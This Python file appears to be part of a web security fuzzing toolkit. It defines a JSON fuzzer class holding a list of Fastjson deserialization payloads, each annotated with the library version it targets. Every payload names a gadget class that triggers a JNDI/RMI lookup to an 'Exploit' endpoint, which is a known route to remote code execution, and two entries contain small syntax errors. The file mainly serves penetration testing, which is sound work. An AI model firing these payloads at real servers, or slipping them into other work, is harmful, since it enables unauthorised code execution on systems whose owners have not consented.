#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class JSON(Fuzzer):

    # https://xz.aliyun.com/t/7568
    fastjsons_payloads = [
        """{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit",""autoCommit":true}""",
        # 1.2.42
        """{"@type":"LLcom.sun.rowset.RowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}""",
        # 1.2.25v1.2.43
        """{"@type":"[com.sun.rowset.RowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}""",
        # 1.2.25
        """{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties"："data_source":"rmi://localhost:1099/Exploit"}}""",
        """{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}""",
        # 1.2.60
        """{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"}""",
        # 1.2.60
        """{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"}""",
        # 1.2.61
        """{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"}""",
        # 1.2.62
        """{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"rmi://localhost:1099/Exploit\"}""",
        # AnterosDBCPConfig
        """{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"rmi://localhost:1099/Exploit\"}""",
        # AnterosDBCPConfig
        """{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://localhost:1099/Exploit\"}""",
        # JtaTransactionConfig
        """{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"UserTransaction\":\"rmi://localhost:1099/Exploit\"}}""",
    ]

    def __init__(self):
        super(JSON, self).__init__()
